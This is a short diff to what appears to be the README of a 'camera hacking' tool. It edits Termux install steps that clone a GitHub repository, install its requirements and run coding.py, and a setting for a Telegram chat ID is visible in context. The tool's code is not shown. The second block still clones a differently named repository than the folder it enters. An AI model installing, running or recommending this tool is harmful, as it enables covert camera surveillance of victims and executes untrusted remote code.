@@ -87,7 +87,7 @@ TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
 pkg update && pkg upgrade -y
 pkg install python -y
 git clone https://github.com/Zeonexploiter/ZEON__CAMERAHACKING.git
-cd ZEONCAMERAHACKING
+cd ZEON__CAMERAHACKING
 pip install -r requirements.txt
 python coding.py
 ```
@@ -96,7 +96,7 @@ python coding.py
 
 ```bash
 git clone https://github.com/Zeonexploiter/ZEONCAMERAHACKING.git
-cd ZEONCAMERAHACKING
+cd ZEON__CAMERAHACKING
 pip install -r requirements.txt
 python coding.py
 ```
